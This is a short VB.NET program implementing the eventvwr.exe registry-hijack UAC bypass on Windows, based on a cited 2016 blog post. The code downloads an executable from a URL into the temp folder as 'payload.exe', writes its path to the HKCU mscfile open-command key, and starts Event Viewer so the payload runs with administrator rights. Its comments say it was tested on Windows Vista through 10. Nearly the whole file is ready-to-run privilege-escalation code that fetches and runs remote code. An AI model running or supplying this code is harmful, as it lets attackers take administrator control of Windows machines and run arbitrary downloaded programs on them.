'Tested on Windows Vista, 7, 8, 8.1, 10 32/64Bit
'Based off; https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
'Can be done in any language that supports interaction with Windows resistry
Module Module1
    Dim URLtoFile As String = "https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe" 'URL to PayLoad
    Dim FilePath As String = IO.Path.GetTempPath
    'How this works
    'When eventvwr.exe is ran it starts a process call mmc.exe using the key HKLM\Software\Classes\mscfile\shell\open\command as admin
    'eventvwr.exe also will lounch the key in HLCU so you just make a key and lounch
    Sub Main()
        Dim Client As New Net.WebClient
        Client.DownloadFile(URLtoFile, FilePath + "payload.exe") 'Downlaod and Save the Payload
        Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command").SetValue("", FilePath + "payload.exe") 'Create a registry entry to the payload
        Process.Start("eventvwr.exe") 'Start Event Viewer
        'This makes Windows lounch the payload with admin rights, as a background application
'You should also delete the key made so even viewer works normal again.
    End Sub

End Module
